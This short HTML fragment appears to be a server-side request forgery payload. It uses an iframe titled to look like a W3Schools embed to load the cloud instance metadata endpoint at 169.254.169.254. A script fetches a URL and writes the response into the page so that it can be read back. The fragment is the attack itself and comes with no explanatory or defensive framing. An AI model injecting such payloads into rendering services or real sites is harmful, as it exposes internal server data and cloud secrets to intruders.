...
<iframe src="http://169.254.169.254/hetzner/v1/metadata" title="W3Schools Free Online Web Tutorials">
</iframe>

<script>
fetch('https://example.com').then(r=>r.text()).then(t=>document.body.innerHTML='<pre>'+t+'</pre>');
</script>
